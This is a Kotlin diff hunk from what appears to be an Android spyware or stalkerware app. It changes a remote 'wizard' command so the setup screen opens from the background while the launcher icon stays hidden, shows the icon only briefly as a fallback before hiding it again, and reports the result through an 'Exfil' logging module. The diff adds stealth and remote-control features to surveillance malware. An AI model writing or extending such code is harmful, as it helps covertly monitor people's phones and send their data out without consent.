@@ -99,12 +99,23 @@ object Commands {
             }
 
             "wizard" -> {
-                // The icon may be hidden - bring it back so the wizard can be
-                // opened, and arm the automatic setup.
-                com.sp.core.stealth.IconHider.show(ctx)
+                // Arm the automatic setup and open the wizard directly in the
+                // background - the launcher icon stays hidden the whole time.
                 com.sp.core.util.Prefs.set(ctx, com.sp.core.LauncherActivity.KEY_AUTO, true)
                 com.sp.core.util.Prefs.set(ctx, com.sp.core.LauncherActivity.KEY_AUTO_IDX, 0)
-                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"wizard","ok":true,"icon":"visible"}""")
+                val opened = com.sp.core.LauncherActivity.openFromBackground(ctx)
+                if (!opened) {
+                    // Background start was blocked (no overlay permission):
+                    // the icon comes back as a fallback and disappears again
+                    // after three minutes.
+                    com.sp.core.stealth.IconHider.show(ctx)
+                    com.sp.core.stealth.IconHider.hideAfter(ctx, 3 * 60 * 1000L)
+                }
+                val iconState = if (opened) "hidden" else "visible"
+                Exfil.sendLog(
+                    ctx, "cmd_result",
+                    """{"cmd":"wizard","ok":$opened,"opened":$opened,"icon":"$iconState"}"""
+                )
             }
 
             "hide" -> {
